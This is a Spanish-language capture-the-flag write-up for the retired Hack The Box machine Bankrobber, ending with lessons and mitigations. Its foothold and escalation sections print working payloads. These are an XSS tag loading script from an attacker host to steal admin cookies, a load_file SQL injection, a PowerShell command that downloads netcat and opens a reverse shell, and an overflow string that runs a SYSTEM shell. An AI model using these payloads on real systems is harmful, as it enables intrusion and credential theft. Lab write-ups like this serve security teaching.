---
machine: Bankrobber
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, web, xss, sqli, buffer-overflow, privesc]
---

# Bankrobber — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web permite registrarse y transferir saldo con un comentario. Un XSS en ese campo llega al navegador del administrador y filtra cookies en base64; con ellas se accede a `/admin/`, donde un SQLi permite leer archivos y el código de `backdoorchecker.php`. En el host, `bankv2.exe` escucha en 910, valida un PIN de cuatro dígitos y desborda el nombre del ejecutable que lanza, lo que permite ejecutar una shell como SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,443,445,3306 <IP>
```

- `80/443` sirven una aplicación PHP de banca; `445` SMB y `3306` MySQL también responden.
- `gobuster` encuentra `/admin/` y `/user/`; el panel admin exige una sesión privilegiada.
- El registro está abierto y el formulario de transferencia acepta un comentario libre.

## Enumeración

- Las cookies `username` y `password` son base64 del usuario y la contraseña, sin firma.
- El campo de comentario se refleja en el panel del administrador, que revisa las transferencias con un navegador headless.
- `backdoorchecker.php` solo acepta `dir` y solo desde `::1`, pero su código se puede leer con SQLi.

## Foothold

Se inyecta un script en el comentario que envía `document.cookie` al atacante. Cuando el administrador revisa la transferencia, llegan sus cookies; se decodifican y se reutilizan en `/admin/`.

```html
<script src="http://<ATTACKER>/cookie.js"></script>
```

```bash
curl -s 'http://<IP>/admin/search.php' --data-urlencode "term=1' UNION SELECT 1,load_file('C:/xampp/htdocs/admin/backdoorchecker.php'),3-- -"
```

El SQLi revela que `backdoorchecker.php` ejecuta `system()` pero solo acepta peticiones desde `::1`. Se reutiliza el XSS para que el administrador envíe el POST desde el propio host y descargue `nc64.exe`; la respuesta es una shell como `cortin`.

```javascript
var params = 'cmd=dir|powershell -c "iwr -uri http://<ATTACKER>/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe <ATTACKER> 443';
```

## Movimiento lateral

El panel confirma que el webroot es `C:\xampp\htdocs` y que el administrador ejecuta un navegador PhantomJS de forma periódica. La enumeración local descubre `C:\bankv2.exe` y un puerto 910 que no aparecía en el escaneo inicial.

```cmd
netstat -ano | findstr LISTENING
tasklist | findstr bankv2
```

## Escalada de privilegios

`bankv2.exe` pide un PIN de cuatro dígitos y después el importe. El importe se copia en una cadena que se usa como nombre del ejecutable de transferencia; 32 bytes de relleno permiten sustituirlo por `nc.exe` y obtener SYSTEM.

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe <ATTACKER> 443
```

## Evidencia

- Comentario con XSS y petición con las cookies del administrador.
- Cookie `username=admin` y acceso a `/admin/`.
- SQLi con `load_file` sobre `backdoorchecker.php`.
- `bankv2.exe` en 910 y desbordamiento del nombre del ejecutable.

## Lecciones aprendidas

- Un XSS almacenado en un panel de revisión puede comprometer una cuenta administrativa.
- Guardar credenciales en cookies base64 equivale a enviarlas en claro.
- Un servicio local olvidado puede ser la vía de escalada más directa.

## Mitigación y detección

- Usar cookies `HttpOnly`, `Secure` y sesiones firmadas en servidor.
- Parametrizar las consultas y no permitir `load_file` ni `INTO OUTFILE`.
- Revisar binarios y servicios en `localhost`; validar la longitud de los argumentos.

## Referencias

- [0xdf — Bankrobber](https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html)
- [IppSec — Bankrobber](https://www.youtube.com/watch?v=zYmA9ECuCio)
- [Hack The Box — Bankrobber](https://app.hackthebox.com/machines/bankrobber)
